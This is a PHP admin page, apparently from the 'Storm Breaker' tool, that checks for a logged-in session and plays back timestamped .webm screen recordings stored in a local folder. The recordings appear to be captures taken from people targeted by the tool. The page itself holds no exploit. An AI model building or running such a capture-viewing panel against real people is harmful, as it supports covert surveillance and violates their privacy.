<?php
session_start();
include "./assets/components/login-arc.php";

// Check authentication
if(!isset($_SESSION['IAm-logined'])) {
    header('location: login.php');
    exit;
}

$screenshotsDir = 'screenshots';
$screenshots = [];
if (file_exists($screenshotsDir)) {
    $files = array_diff(scandir($screenshotsDir), array('.', '..'));
    foreach ($files as $file) {
        if (pathinfo($file, PATHINFO_EXTENSION) === 'webm') {
            $screenshots[] = $file;
        }
    }
    rsort($screenshots); // Sort by newest first
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Screen Captures - Storm Breaker</title>
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <style>
        .screenshot-container {
            margin-bottom: 20px;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        video {
            max-width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="container mt-4">
        <h2>Screen Captures</h2>
        <div class="row">
            <?php foreach ($screenshots as $screenshot): ?>
                <div class="col-md-6 screenshot-container">
                    <h5><?php echo date('Y-m-d H:i:s', substr($screenshot, 0, 10)); ?></h5>
                    <video controls>
                        <source src="screenshots/<?php echo htmlspecialchars($screenshot); ?>" type="video/webm">
                        Your browser does not support the video tag.
                    </video>
                </div>
            <?php endforeach; ?>
        </div>
    </div>
</body>
</html> 